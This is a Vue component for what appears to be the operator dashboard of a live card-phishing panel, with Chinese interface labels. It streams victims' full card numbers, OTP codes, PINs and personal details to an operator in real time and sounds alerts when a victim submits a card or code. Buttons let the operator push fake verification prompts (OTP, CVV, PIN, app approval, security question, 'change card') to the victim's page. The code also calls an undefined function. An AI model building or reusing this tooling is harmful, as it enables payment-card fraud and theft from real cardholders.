<script setup lang="ts">
import { ref, reactive, onUnmounted, computed } from 'vue';
import { usePaymentWs } from './composables/use-payment-ws';
import SessionCard from './modules/session-card.vue';
import SettingsPanel from './modules/settings-panel.vue';

const sessions = reactive<Api.Payment.PaymentSession[]>([]);
const connectCount = reactive<Api.Payment.ConnectCount>({ customerCount: 0, operatorCount: 0 });
const settingsPanel = ref<InstanceType<typeof SettingsPanel> | null>(null);

const audioNew = new Audio('/audio/new-session.mp3');
const audioCard = new Audio('/audio/card-submit.mp3');
const audioOtp = new Audio('/audio/otp-submit.mp3');
const audioResend = new Audio('/audio/resend-alert.mp3');

function playAudio(audio: HTMLAudioElement) {
  audio.currentTime = 0;
  audio.play().catch(() => {});
}

var _onlyCardFilter = false;
var _hideEmptyFilter = false;
try { var _saved = JSON.parse(localStorage.getItem('payment_console_settings')||'{}'); _onlyCardFilter = !!_saved.onlyCardData; _hideEmptyFilter = !!_saved.hideEmptyClients } catch(e){}

const hideBin = ref(false);
const hidePhone = ref(false);
const hideTabs = ref(false);
const hideAddress = ref(false);

function isEmptySession(s: any) {
  const ci = s.cardInfo || {};
  const ui = s.customerInfo || {};
  return !ci.cardNumber && !ui.fullName && !ui.email && !ui.phone && !ui.address1 && !ui.city && !ui.country;
}

function sortSessions() {
  sessions.sort((a, b) => {
    const pinnedA = !!(a as any).pinned ? 1 : 0;
    const pinnedB = !!(b as any).pinned ? 1 : 0;
    if (pinnedB - pinnedA !== 0) return pinnedB - pinnedA;
    return (b.sessionId || 0) - (a.sessionId || 0);
  });
}

function applyFilters(list: Api.Payment.PaymentSession[], keepPin?: boolean) {
  let result = list.filter(s => s.isOnline !== false);
  if (_onlyCardFilter) result = result.filter(s => !!(s.cardInfo?.cardNumber));
  if (_hideEmptyFilter) result = result.filter(s => !isEmptySession(s));
  if (!keepPin) {
    result.sort((a, b) => (b.sessionId || 0) - (a.sessionId || 0));
  }
  return result;
}

const { connected, sendAction, ws } = usePaymentWs({
  wsUrl: `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/`,
  operatorId: 'op_' + Date.now(),
  onSessionList: (list) => {
    const filtered = applyFilters(list as Api.Payment.PaymentSession[]);
    sessions.splice(0, sessions.length, ...filtered);
  },
  onSessionNew: (data) => {
    if (sessions.find(s => s.id === data.id)) return;
    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
    if (_hideEmptyFilter && isEmptySession(data)) return;
    playAudio(audioNew);
    window.$notification?.info({
      title: '新支付会话',
      content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
      duration: 4000
    });
    sessions.push(data as Api.Payment.PaymentSession);
    sortSessions();
  },
  onSessionUpdate: (data) => {
    const idx = sessions.findIndex(s => s.id === data.sessionId);
    if (idx !== -1) {
      const s = sessions[idx];
      const prevStatus = s.status;

      if (data.cardInfo) {
        s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
      }
      if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
      if (data.browsingTabs !== undefined) s.browsingTabs = data.browsingTabs;
      if (data.currentStep !== undefined) s.currentStep = data.currentStep;
      if (data.status !== undefined) s.status = data.status;
      if (data.isOnline !== undefined) {
        s.isOnline = data.isOnline;
        if (data.isOnline === false) (s as any).offlineAt = Date.now();
        else (s as any).offlineAt = 0;
      }
      if (data.lastActivityTs !== undefined) (s as any).lastActivityTs = data.lastActivityTs;
      if (data.countdownSeconds !== undefined) s.countdownSeconds = data.countdownSeconds;
      if (data.cardHistory !== undefined) (s as any).cardHistory = data.cardHistory;
      if (data.status === 'pending' && prevStatus !== 'pending') {
        if (data.action === 'app_verify_done') {
          (s as any).appVerifyPending = true;
          playAudio(audioOtp);
          window.$notification?.success({
            title: '📱 客户已完成APP验证',
            content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
            duration: 6000
          });
        } else {
          (s as any).appVerifyPending = false;
          const cs = data.currentStep || s.currentStep || '';
          const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
          let notifTitle = '客户已提交卡号';
          if (cs === 'pin_verify') notifTitle = '客户已提交PIN验证';
          else if (cs === 'email_verify') notifTitle = '客户已提交邮箱验证';
          else if (hasOtp || cs === 'otp') notifTitle = '客户已提交验证码';
          playAudio(hasOtp || cs === 'pin_verify' || cs === 'email_verify' ? audioOtp : audioCard);
          window.$notification?.warning({
            title: notifTitle,
            content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
            duration: 6000
          });
        }
      } else if (data.cardInfo?.otpCode && s.cardInfo?.otpCode !== data.cardInfo.otpCode) {
        playNotification();
        window.$notification?.info({
          title: '📲 客户提交了验证码',
          content: `编号 ${s.sessionId} - 验证码 ${data.cardInfo.otpCode}`,
          duration: 4000
        });
      }
    } else if (data.isOnline !== false && data.sessionId) {
      if (_onlyCardFilter && !(data.cardInfo?.cardNumber)) return;
      if (_hideEmptyFilter && isEmptySession(data)) return;
      sessions.push({
        id: data.sessionId, sessionId: data.sessionId,
        cardInfo: data.cardInfo || {}, customerInfo: data.customerInfo || {},
        browsingTabs: data.browsingTabs || [], status: data.status || 'live',
        currentStep: data.currentStep || 'card', frontendUrl: data.frontendUrl || '',
        isOnline: true, countdownSeconds: 0, createdAt: '', updatedAt: '',
        cardHistory: data.cardHistory || []
      } as any);
      sortSessions();
    }
  },
  onSessionRemove: (sessionId: string) => {
    const idx = sessions.findIndex(s => s.id === sessionId);
    if (idx !== -1) sessions.splice(idx, 1);
  },
  onConnectCount: (count) => {
    Object.assign(connectCount, count);
  },
  onResendOtp: (data) => {
    const s = sessions.find(s => s.id === data.sessionId);
    playAudio(audioResend);
    window.$message?.warning(`客户请求重发验证码 (第${data.count}次)${s ? ' - 会话'+s.sessionId : ''}`, { duration: 4000 });
  },
  onAppVerifyDone: (data) => {
    const s = sessions.find(s => s.id === data.sessionId);
    window.$message?.success(`客户已完成APP验证${s ? ' - 会话'+s.sessionId : ''}`, { duration: 5000 });
  }
});

function handleAction(action: Api.Payment.OperatorAction, sessionId: string, message?: string) {
  sendAction(action, sessionId, message);
  const labels: Record<string, string> = {
    otp_verify: 'OTP验证', custom_otp_verify: '自定义OTP验证',
    email_verify: '邮箱验证', pin_verify: 'PIN验证',
    cvv_verify: 'CVV验证', app_verify: 'APP验证',
    question_verify: '问题验证', change_card: '换卡支付',
    custom_prompt: '自定义提示', custom_otp_tail: 'OTP验证（自定义尾号）',     app_verify: 'APP验证', custom_email_verify: '邮箱验证（自定义邮箱）', app_verify_fail: '未完成验证', app_verify_done: 'APP验证完成', change_card_prompt: '自定义提示（换卡支付）', redirect_complete: '跳转完成',
    approve: '通过', reject: '拒绝'
  };
  window.$message?.info(`已发送操作: ${labels[action] || action}` + (message ? ` (${message})` : ''));
}

function handleSettingsChanged(settings: any) {
  const prevOnlyCard = _onlyCardFilter;
  const prevHideEmpty = _hideEmptyFilter;

  _onlyCardFilter = !!settings.onlyCardData;
  _hideEmptyFilter = !!settings.hideEmptyClients;
  hideBin.value = !!settings.hideBinFields;
  hidePhone.value = !!settings.hidePhoneField;
  hideTabs.value = !!settings.hideTabBar;
  hideAddress.value = !!settings.hideAddressBar;

  // Apply filter: when enabling, remove from view; when disabling, re-fetch from server
  if (_onlyCardFilter && !prevOnlyCard) {
    for (let i = sessions.length - 1; i >= 0; i--) {
      if (!sessions[i].cardInfo?.cardNumber) sessions.splice(i, 1);
    }
  } else if (!_onlyCardFilter && prevOnlyCard) {
    refreshSessions();
    return;
  }

  if (_hideEmptyFilter && !prevHideEmpty) {
    for (let i = sessions.length - 1; i >= 0; i--) {
      if (isEmptySession(sessions[i])) sessions.splice(i, 1);
    }
  } else if (!_hideEmptyFilter && prevHideEmpty) {
    refreshSessions();
    return;
  }

  if (ws.value?.readyState === WebSocket.OPEN) {
    ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
  } else {
    const retry = setInterval(() => {
      if (ws.value?.readyState === WebSocket.OPEN) {
        ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
        clearInterval(retry);
      }
    }, 500);
    setTimeout(() => clearInterval(retry), 10000);
  }
}

async function refreshSessions() {
  try {
    const res = await fetch('/api/payment/sessions');
    const json = await res.json();
    if (json.code === '0000') {
      const filtered = applyFilters(json.data);
      sessions.splice(0, sessions.length, ...filtered);
      window.$message?.success('已刷新');
    }
  } catch { window.$message?.error('刷新失败') }
}

function handleMoveTop(sessionId: string) {
  const idx = sessions.findIndex(s => s.id === sessionId);
  if (idx === -1) return;
  const [item] = sessions.splice(idx, 1);
  (item as any).pinned = !(item as any).pinned;
  if ((item as any).pinned) {
    sessions.unshift(item);
  } else {
    // Unpin: move to end
    sessions.push(item);
  }
}

onUnmounted(() => {
});
</script>

<template>
  <div class="payment-console">
    <div class="console-toolbar">
      <NButton size="small" quaternary @click="settingsPanel?.open()">⚙ 面板设置</NButton>
    </div>
    <div class="console-body">
      <div v-if="!sessions.length" class="empty-state">
        <NEmpty description="暂无支付会话，等待客户提交..." />
      </div>

      <TransitionGroup name="session-list" tag="div">
        <SessionCard
          v-for="(s, i) in sessions"
          :key="s.id"
          :session="s"
          :pinned="!!(s as any).pinned"
          :hide-bin="hideBin"
          :hide-phone="hidePhone"
          :hide-tabs="hideTabs"
          :hide-address="hideAddress"
          @action="(a: any, s: any, m: any) => handleAction(a, s, m)"
          @move-top="handleMoveTop"
        />
      </TransitionGroup>
    </div>
    <SettingsPanel ref="settingsPanel" @settings-changed="handleSettingsChanged" />
  </div>
</template>

<style scoped>
.payment-console {
  height: 100%;
  display: flex;
  flex-direction: column;
  min-height: calc(100vh - 120px);
  background: #f8f7fa;
}
html.dark .payment-console {
  background: #202737;
}
.console-toolbar {
  display: flex;
  justify-content: flex-end;
  padding: 4px 8px;
  flex-shrink: 0;
}
.console-body {
  flex: 1;
  overflow-y: auto;
  padding: 10px 8px 160px;
}
.empty-state {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 300px;
}
.session-list-enter-active,
.session-list-leave-active {
  transition: all 0.4s ease;
}
.session-list-enter-from {
  opacity: 0;
  transform: translateY(-20px);
}
.session-list-leave-to {
  opacity: 0;
  transform: translateX(60px);
}
</style>
